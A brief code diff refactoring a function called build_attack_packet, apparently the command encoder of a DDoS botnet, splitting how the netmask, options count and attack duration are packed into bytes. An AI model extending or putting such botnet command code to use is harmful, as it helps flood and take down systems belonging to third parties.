@@ -42,7 +42,8 @@ def build_attack_packet(method, target, duration):
     packet += ip_bytes
     
     # Netmask, options, duration
-    packet += struct.pack('<BBI', 32, 0, duration)
+    packet += struct.pack('<BB', 32, 0)  # netmask=32, opts_count=0
+    packet += struct.pack('<I', duration)  # duration as little-endian
     
     return packet
 
